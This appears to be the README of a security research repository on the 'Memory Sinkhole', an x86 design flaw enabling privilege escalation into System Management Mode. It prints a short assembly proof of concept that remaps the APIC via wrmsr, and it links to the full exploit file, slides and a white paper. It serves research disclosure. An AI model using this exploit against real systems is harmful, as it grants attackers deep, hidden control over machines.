## The Memory Sinkhole
: An x86 design flaw allowing ring -2 privilege escalation.

### Overview

The memory sinkhole is a design flaw in x86 processors that allows code to
escalate privileges into ring -2 (System Management Mode).

```
wbinvd
mov dword [0x10014], 0xffcf9aff
mov dword [0x10010], 0x9fa2ffff

mov eax, 0x1f5ff900
mov edx, 0
mov ecx, 0x1b
wrmsr

jmp $
```

The proof of concept [APIC overlay attack](sinkhole.asm) illustrates one
approach for using the flaw to elevate privileges.

### References

The technique is outlined in detail in the [Black Hat
presentation](https://www.youtube.com/watch?v=lR0nh-TdpVg).

Slides from the presentation are provided [here](us-15-Domas-TheMemorySinkhole.pdf).

The exploit [white paper](us-15-Domas-TheMemorySinkhole-wp.pdf) provides a
technical overview of the flaw and exploitation approach.

### Author

The Memory Sinkhole is a research effort from Christopher Domas
([@xoreaxeaxeax](https://twitter.com/xoreaxeaxeax)).
